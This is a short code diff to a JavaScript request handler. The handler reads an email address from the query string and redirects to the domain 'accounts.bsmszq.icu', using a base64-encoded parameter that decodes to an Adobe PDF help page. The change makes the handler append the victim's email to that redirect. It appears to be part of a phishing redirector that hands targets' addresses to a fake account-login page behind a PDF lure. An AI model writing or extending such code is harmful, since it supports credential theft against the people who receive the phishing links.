@@ -35,7 +35,7 @@ export default function handler(req, res) {
     // Extract email from query string
     const url = new URL(req.url, 'http://localhost');
     const email = url.searchParams.get('email');
-    let redirectUrl = 'https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=';
+    let redirectUrl = 'https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=&smn=';
 
     // If email exists, append to redirect
     if (email) {
